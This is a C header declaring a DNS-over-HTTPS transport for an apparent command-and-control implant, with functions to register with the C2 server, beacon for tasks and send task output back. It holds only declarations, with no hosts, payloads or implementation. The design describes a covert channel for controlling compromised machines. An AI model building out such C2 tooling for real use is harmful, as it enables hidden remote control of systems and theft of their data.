#pragma once
#include "transport.h"

// Register with C2 (delegates to HTTP /register). Returns 1 on success.
int transport_doh_register(void);

// Poll for tasks via DoH. Returns heap-allocated array; *count set to number.
AgentTask* transport_doh_beacon(int *count);

// Send result via DoH (GET if small, POST if large).
void transport_doh_send_result(long long task_id, const char *output,
                               const char *error, int is_admin);
